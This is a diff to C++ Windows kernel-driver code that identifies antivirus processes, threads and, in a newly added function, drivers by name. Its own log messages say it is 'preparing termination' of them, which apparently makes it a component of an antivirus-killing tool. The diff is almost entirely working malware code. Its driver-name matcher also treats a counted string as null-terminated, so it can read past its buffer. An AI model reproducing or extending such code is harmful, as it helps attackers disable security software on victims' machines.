@@ -5,7 +5,9 @@
 #include "hooks.h"
 
 
-
+LONG g_logged = 0;
+LONG g_logged1 = 0;
+LONG g_logged2 = 0;
 
 bool AV::process_extraction( PEPROCESS process, LPCWSTR target_name ) {
 
@@ -47,8 +49,10 @@ bool AV::process_extraction( PEPROCESS process, LPCWSTR target_name ) {
 
     ExFreePool( process_image_name );
     
-    Logger::Print( Logger::Level::Info, "AV Process identified - preparing termination" );
+    if ( InterlockedCompareExchange( &g_logged, 1, 0 ) == 0 ) 
+        Logger::Print( Logger::Level::Info, "AV Process identified - preparing termination" );
 
+    return true;
 }
 
 
@@ -93,9 +97,59 @@ bool AV::thread_extraction( PETHREAD thread, LPCWSTR target_name ) {
 
 
     ExFreePool( process_image_name );
-    Logger::Print( Logger::Level::Info, "AV Thread identified - preparing termination" );
+    if ( InterlockedCompareExchange( &g_logged1, 1, 0 ) == 0 ) 
+        Logger::Print( Logger::Level::Info, "AV Thread identified - preparing termination" );
+
     return true;
 
-
-
 }
+
+bool AV::driver_name_extraction( DRIVER_OBJECT* driver_object, LPCWSTR target_filename ) {
+
+    if ( !driver_object || !target_filename )
+        return false;
+
+
+    UNICODE_STRING driver_name = driver_object->DriverName;
+
+    if ( !driver_name.Buffer || driver_name.Length == 0 )
+        return false;
+
+
+    const WCHAR* buffer = driver_name.Buffer;
+    size_t max_length = driver_name.Length / sizeof( WCHAR );
+
+    const WCHAR* filename_start = nullptr;
+    for ( size_t i = max_length; i > 0; --i ) {
+        if ( buffer[i - 1] == L'\\' ) {
+            filename_start = &buffer[i];
+            break;
+        }
+    }
+
+    if ( !filename_start )
+        filename_start = buffer;
+
+
+    while ( *filename_start && *target_filename ) {
+        WCHAR a = *filename_start++;
+        WCHAR b = *target_filename++;
+
+        a = RtlUpcaseUnicodeChar( a );
+        b = RtlUpcaseUnicodeChar( b );
+
+        if ( a != b )
+            return false;
+
+    }
+
+    if ( *filename_start || *target_filename )
+        return false;
+
+
+    if ( InterlockedCompareExchange( &g_logged2, 1, 0 ) == 0 )
+        Logger::Print( Logger::Level::Info, "AV Driver identified - preparing termination" );
+    return true;
+}
+
+
